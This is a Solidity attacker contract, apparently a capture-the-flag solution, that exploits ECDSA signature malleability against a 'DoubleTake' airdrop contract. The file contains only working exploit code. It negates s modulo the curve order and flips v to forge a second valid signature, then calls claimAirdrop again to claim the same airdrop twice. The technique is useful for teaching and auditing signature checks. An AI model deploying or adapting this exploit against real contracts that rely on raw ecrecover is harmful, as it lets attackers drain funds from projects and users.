// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "hardhat/console.sol";

interface IDoubleTake {
    function claimAirdrop(address user, uint256 amount, uint8 v, bytes32 r, bytes32 s) external;
}

contract DoubleTakeAttacker {
    function modNegS(uint256 s) public pure returns (uint256) {
        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        return n - s;
    }

    function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
        require(sig.length == 65, "Invalid signature length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }

    function manipulateSignature(uint8 v, bytes32 r, bytes32 s) public pure returns (uint8 nv, bytes32 nr, bytes32 ns) {
        nv = v % 2 == 0 ? v - 1 : v + 1;
        nr = r;
        ns = bytes32(modNegS(uint256(s)));
    }

    function attack(address victim, address user, uint256 amount, uint8 v, bytes32 r, bytes32 s) public {
        bytes32 _msgHash = keccak256(abi.encode(user, amount));
        address signer = ecrecover(_msgHash, v, r, s);

        (uint8 nv, bytes32 nr, bytes32 ns) = manipulateSignature(v, r, s);
        require(signer == ecrecover(_msgHash, nv, nr, ns), "signature malleability failed");

        IDoubleTake(victim).claimAirdrop(user, amount, nv, nr, ns);
    }
}
